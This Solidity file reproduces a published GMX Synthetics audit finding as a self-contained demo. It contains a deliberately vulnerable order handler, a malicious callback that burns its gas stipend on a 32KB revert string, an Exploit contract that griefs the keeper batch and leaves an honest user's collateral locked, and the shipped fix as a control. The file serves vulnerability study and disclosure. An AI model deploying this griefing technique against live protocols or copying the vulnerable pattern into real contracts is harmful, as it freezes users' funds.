// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  GMX Synthetics — H-6 long callback revert griefs a keeper batch
    (Sherlock 2023-02-gmx, finding 18632).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: afterOrderCancellation forwards only callbackGasLimit to the
    user's callback, then copies the entire revert blob into the keeper's
    frame (ErrorUtils.getRevertMessage) and logs it. GasUtils estimates the
    keeper budget as base + callbackGasLimit once. A callback that spends
    that stipend on a long Error(string) makes the catch cost about as much
    again, so the keeper's execute reverts. An honest order later in the
    same batch is not filled and its collateral stays escrowed.

    The control (OrderHandlerFixed) is the shipped fix from
    gmx-synthetics b0bac262: catch the revert and do not copy reasonBytes.
    Same budget, the honest order fills. */

library OrderLib {
    struct Props {
        address account;
        address callbackAddr;
        uint256 gasLimit;
        uint256 collateral;
        bool filled;
    }

    function callbackContract(Props memory order) internal pure returns (address) {
        return order.callbackAddr;
    }

    function callbackGasLimit(Props memory order) internal pure returns (uint256) {
        return order.gasLimit;
    }
}

interface IOrderCallbackReceiver {
    function afterOrderCancellation(bytes32 key, OrderLib.Props memory order) external;
}

using OrderLib for OrderLib.Props;

library ErrorUtils {
    // Verbatim from gmx-synthetics/contracts/utils/ErrorUtils.sol (audited tree).
    function getRevertMessage(bytes memory result) internal pure returns (string memory, bool) {
        if (result.length < 68) {
            return ("", false);
        }

        bytes4 errorSelector = getErrorSelectorFromData(result);

        // 0x08c379a0 is the selector for Error(string)
        if (errorSelector == bytes4(0x08c379a0)) {
            assembly {
                result := add(result, 0x04)
            }

            return (abi.decode(result, (string)), true);
        }

        return ("", false);
    }

    function getErrorSelectorFromData(bytes memory data) internal pure returns (bytes4) {
        bytes4 errorSelector;

        assembly {
            errorSelector := mload(add(data, 0x20))
        }

        return errorSelector;
    }
}

contract CollateralToken {
    string public name = "USDC";
    string public symbol = "USDC";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// Callback that spends the forwarded stipend building a long Error(string).
contract LongRevertCallback is IOrderCallbackReceiver {
    uint256 public constant REVERT_LEN = 32_000;

    function afterOrderCancellation(bytes32, OrderLib.Props memory) external view override {
        bytes memory blob = new bytes(REVERT_LEN);
        blob[0] = 0x41;
        blob[REVERT_LEN - 1] = 0x5a;
        // Hash the whole 32KB blob. KECCAK256 costs 30 + 6 gas per word,
        // so one iteration is ~6,030 gas and ~60 iterations spend the
        // stipend. The digest is written back into the blob, which keeps
        // the loop alive under viaIR. Gas left above 120,000 would otherwise
        // be refunded to the keeper and pay for the catch.
        assembly {
            let data := add(blob, 32)
            for { let i := 0 } and(lt(i, 80), gt(gas(), 120000)) { i := add(i, 1) } {
                mstore(add(data, mul(mod(i, 64), 32)), keccak256(data, 32000))
            }
        }
        revert(string(blob));
    }
}

contract OrderHandler {
    // GasUtils.estimateExecuteOrderGasLimit adds callbackGasLimit once.
    // It does not reserve a second copy for getRevertMessage or the log.
    uint256 public constant CALLBACK_GAS_LIMIT = 500_000;
    uint256 public constant KEEPER_BASE_GAS = 220_000;
    uint256 public constant HONEST_COLLATERAL = 1000 ether;

    event AfterOrderCancellationError(bytes32 key, OrderLib.Props order, string reason, bytes reasonBytes);

    CollateralToken public collateral;
    mapping(bytes32 => OrderLib.Props) public orders;
    mapping(address => uint256) public locked;
    uint256 public ordersCount;
    uint256 public filledCount;

    constructor(CollateralToken collateral_) {
        collateral = collateral_;
    }

    function keeperBudget() public pure returns (uint256) {
        return KEEPER_BASE_GAS + CALLBACK_GAS_LIMIT;
    }

    function lockedOf(address account) external view returns (uint256) {
        return locked[account];
    }

    function isFilled(bytes32 key) external view returns (bool) {
        return orders[key].filled;
    }

    function createOrder(address account, address callback, uint256 amount, uint256 gasLimit)
        external
        returns (bytes32 key)
    {
        key = keccak256(abi.encode(account, amount, callback, ordersCount));
        ordersCount += 1;
        if (amount > 0) {
            collateral.mint(address(this), amount);
            locked[account] += amount;
        }
        orders[key] = OrderLib.Props({
            account: account,
            callbackAddr: callback,
            gasLimit: gasLimit,
            collateral: amount,
            filled: false
        });
    }

    function executeBatch(bytes32 first, bytes32 second) external {
        _execute(first);
        _execute(second);
    }

    function _execute(bytes32 key) internal {
        OrderLib.Props memory order = orders[key];
        afterOrderCancellation(key, order);
        orders[key].filled = true;
        if (order.collateral > 0) {
            locked[order.account] -= order.collateral;
            collateral.transfer(order.account, order.collateral);
        }
        filledCount += 1;
    }

    // Verbatim shape of CallbackUtils.afterOrderCancellation (audited tree).
    function afterOrderCancellation(bytes32 key, OrderLib.Props memory order) internal virtual {
        if (!isValidCallbackContract(order.callbackContract())) {
            return;
        }

        try IOrderCallbackReceiver(order.callbackContract()).afterOrderCancellation{
            gas: order.callbackGasLimit()
        }(key, order) {} catch (bytes memory reasonBytes) {
            // @> VULN: keeper copies and logs the full revert blob; the estimate counted callbackGasLimit once
            (string memory reason, /* bool hasRevertMessage */) = ErrorUtils.getRevertMessage(reasonBytes);
            emit AfterOrderCancellationError(key, order, reason, reasonBytes);
        }
    }

    function isValidCallbackContract(address callback) internal view returns (bool) {
        if (callback == address(0)) {
            return false;
        }
        uint256 size;
        assembly {
            size := extcodesize(callback)
        }
        return size > 0;
    }
}

/// Shipped fix (b0bac262): swallow the callback revert without copying reasonBytes.
contract OrderHandlerFixed is OrderHandler {
    constructor(CollateralToken collateral_) OrderHandler(collateral_) {}

    function afterOrderCancellation(bytes32 key, OrderLib.Props memory order) internal override {
        if (!isValidCallbackContract(order.callbackContract())) {
            return;
        }
        try IOrderCallbackReceiver(order.callbackContract()).afterOrderCancellation{
            gas: order.callbackGasLimit()
        }(key, order) {} catch {
            emit AfterOrderCancellationError(key, order, "", "");
        }
    }
}

contract Exploit {
    address public constant HONEST = 0x2222222222222222222222222222222222222222;
    address public constant ATTACKER = 0x1111111111111111111111111111111111111111;

    CollateralToken public token; // nonce 1
    LongRevertCallback public callback; // nonce 2
    OrderHandler public handler; // nonce 3

    bytes32 public attackKey;
    bytes32 public honestKey;
    bool public batchOk;
    uint256 public revertLen;
    uint256 public probeGas;
    uint256 public honestLocked;
    bool public honestFilled;
    uint256 public vaultBalance;
    uint256 public honestBalance;

    bool public controlOk;
    uint256 public controlLocked;
    uint256 public controlHonestBalance;
    bool public controlFilled;

    constructor() {
        token = new CollateralToken();
        callback = new LongRevertCallback();
        handler = new OrderHandler(token);
    }

    function run() external {
        _probe();
        attackKey = handler.createOrder(ATTACKER, address(callback), 0, handler.CALLBACK_GAS_LIMIT());
        honestKey = handler.createOrder(HONEST, address(0), handler.HONEST_COLLATERAL(), 0);
        uint256 budget = handler.keeperBudget();
        (bool ok,) = address(handler).call{gas: budget}(
            abi.encodeWithSelector(handler.executeBatch.selector, attackKey, honestKey)
        );
        batchOk = ok;
        honestLocked = handler.lockedOf(HONEST);
        honestFilled = handler.isFilled(honestKey);
        vaultBalance = token.balanceOf(address(handler));
        honestBalance = token.balanceOf(HONEST);
        require(revertLen > 10_000, "revert blob too short");
        require(!batchOk, "keeper batch did not revert");
        require(honestLocked == handler.HONEST_COLLATERAL(), "honest collateral not locked");
        require(!honestFilled, "honest order was filled");
        require(vaultBalance == handler.HONEST_COLLATERAL(), "vault does not hold collateral");
        require(honestBalance == 0, "honest user was paid");
    }

    function runControl() external {
        OrderHandlerFixed fixedHandler = new OrderHandlerFixed(token);
        bytes32 malicious = fixedHandler.createOrder(ATTACKER, address(callback), 0, fixedHandler.CALLBACK_GAS_LIMIT());
        bytes32 honest = fixedHandler.createOrder(HONEST, address(0), fixedHandler.HONEST_COLLATERAL(), 0);
        uint256 budget = fixedHandler.keeperBudget();
        (bool ok,) = address(fixedHandler).call{gas: budget}(
            abi.encodeWithSelector(fixedHandler.executeBatch.selector, malicious, honest)
        );
        controlOk = ok;
        controlLocked = fixedHandler.lockedOf(HONEST);
        controlFilled = fixedHandler.isFilled(honest);
        controlHonestBalance = token.balanceOf(HONEST);
        require(ok, "control batch reverted");
        require(controlFilled, "control did not fill");
        require(controlLocked == 0, "control left collateral locked");
        require(controlHonestBalance == fixedHandler.HONEST_COLLATERAL(), "control did not pay honest user");
    }

    function _probe() internal {
        OrderLib.Props memory empty;
        uint256 beforeGas = gasleft();
        try callback.afterOrderCancellation{gas: handler.CALLBACK_GAS_LIMIT()}(bytes32(0), empty) {}
        catch (bytes memory reason) {
            probeGas = beforeGas - gasleft();
            revertLen = reason.length;
        }
    }
}
